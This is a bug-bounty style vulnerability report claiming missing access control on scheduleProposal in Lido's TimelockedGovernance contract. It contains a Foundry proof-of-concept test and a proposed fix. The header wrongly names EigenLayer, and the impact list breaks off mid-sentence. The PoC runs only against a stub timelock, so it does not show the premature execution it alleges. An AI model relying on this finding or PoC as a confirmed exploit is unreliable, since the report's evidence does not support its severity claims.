
# 🛡️ Smart Contract Vulnerability Report
**EigenLayer**:

## 📛 Vulnerability Title 

Unauthorized Proposal Scheduling via Missing Access Control

## 🗂 Report Type

Smart Contract


## 🎯 Target

https://github.com/lidofinance/dual-governance/blob/0d31f5b3dbe0a553887604a2d5755d14033b8e3d/contracts/TimelockedGovernance.sol



## 🗒️Asset

TimelockedGovernance.sol



## 🚨 Rating

Severity: Medium  ~ High  

Impact: Medium 



## 📄 Description


This vulnerability allows an attacker to schedule governance proposals without proper authorization. Since proposals typically involve important decisions such as smart contract upgrades, asset transfers, or changes to sensitive protocol settings, the ability to schedule them prematurely or unintentionally poses a significant risk.




## 🧨 Impact


1. An attacker can schedule submitted proposals without authorization and at will. This can lead to the premature or 
 
2. unintended execution of sensitive proposals, such as:

    Executing critical changes in smart contracts,

    Transferring funds,

    Or applying sensitive protocol settings.





## 🔍 Vulnerability Details

```solidity

Line: 64

contract : TimelockedGovernance.sol


     function scheduleProposal(uint256 proposalId) external {

        TIMELOCK.schedule(proposalId);
    }

```





## 🧪 Proof of Concept (PoC)


```solidity

// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TimelockedGovernance.sol";
import "../lib/libraries/ExternalCalls.sol";
import "../lib/interfaces/ITimelock.sol";



import {Duration} from "../../src/types/Duration.sol";
import {Timestamp} from "../../src/types/Timestamp.sol";    
import {Status as ProposalStatus} from "../libraries/ExecutableProposals.sol";


/*
We created the MockTimelock contract solely for testing purposes, to allow us to create a fake proposal and then call the scheduleProposal function on it.
The real timelock logic didn’t need to be fully replicated — we just needed a way to generate a proposalId and allow it to be scheduled, so we could test access control, timing, and status behavior.
*/
contract MockTimelock is ITimelock {
    uint256 public proposalCounter;
    uint256 public lastScheduledProposal;


    function submit(address, ExternalCall[] calldata) external override returns (uint256) {
        proposalCounter++;
        return proposalCounter;
    }

    function schedule(uint256 proposalId) external override {
        lastScheduledProposal = proposalId;
    }

    function execute(uint256) external override {}

    function cancelAllNonExecutedProposals() external override {}

    function canSchedule(uint256) external view override returns (bool){} 
    function canExecute(uint256) external view override returns (bool) {}

    function getAdminExecutor() external view override returns (address) {}
    function setAdminExecutor(address) external override {}

    function getGovernance() external view override returns (address) {}

    function setGovernance(address) external override {}

    function getProposal(uint256) external view override returns (ProposalDetails memory, ExternalCall[] memory) {}


    function getProposalDetails(uint256) external view override returns (ProposalDetails memory) {}

    function getProposalCalls(uint256) external view override returns (ExternalCall[] memory) {}
    function getProposalsCount() external view override returns (uint256) {}

    function getAfterSubmitDelay() external view override returns (Duration) {}

    function getAfterScheduleDelay() external view override returns (Duration) {}

    function setAfterSubmitDelay(Duration) external override {}

    function setAfterScheduleDelay(Duration) external override {}

    function transferExecutorOwnership(address, address) external override {}
}




contract TimelockedGovernanceTest is Test {
    TimelockedGovernance public timelock;
    MockTimelock public mockTimelock;

    address public governance = address(0x001);
    address public user1 = address(0x002);
    address public user2 = address(0x003);

    uint256 public proposalId; 



// Here, for example, the governance has submitted a proposal.
    function setUp() public {
        mockTimelock = new MockTimelock();
        timelock = new TimelockedGovernance(governance,mockTimelock);
        
        ExternalCall[] memory calls=new ExternalCall[] (1);
        calls[0] = ExternalCall({
            target: address(0xdead),
            value: 0,
            payload: ""
        });

        vm.startPrank(governance);
        proposalId = timelock.submitProposal(calls, "initial metadata");
        vm.stopPrank();
        
    }

/// @notice This test demonstrates that the `scheduleProposal` function has no access control.
/// Any user can call it after a proposal has been submitted by the governance.
/// It proves that the scheduling action is permissionless, regardless of who created the proposal.
/// use this 👻  forge compile | forge test -vvv
    function test_scheduleProposal() public {
        // user1 schedules the proposal for the first time
        // This simulates a legitimate scheduling action by any arbitrary user
        vm.startPrank(user1);
        timelock.scheduleProposal(proposalId);
        console.log("user1 can call scheduleProposal()");
        vm.stopPrank();

        // user2 also schedules the same proposal
        // This shows that multiple users can independently call the same function
        vm.startPrank(user2);
        timelock.scheduleProposal(proposalId);
        console.log("user2 can also call scheduleProposal()");
        vm.stopPrank();
    }
}

```

## How to fix it (Recommended)

1. The function _checkCallerIsGovernance() is already defined in the TimelockedGovernance contract and checks that msg.sender == GOVERNANCE.


```solidity

function scheduleProposal(uint256 proposalId) external {
    _checkCallerIsGovernance();  
    TIMELOCK.schedule(proposalId);
    emit ProposalScheduled(msg.sender, proposalId); 
}

```




2. Adding an event like ProposalScheduled is useful for better tracking of the operation on the blockchain:


```solidity

event ProposalScheduled(address indexed caller, uint256 indexed proposalId);

```


## 🔗 References

- https://github.com/lidofinance/dual-governance/blob/0d31f5b3dbe0a553887604a2d5755d14033b8e3d/contracts/TimelockedGovernance.sol




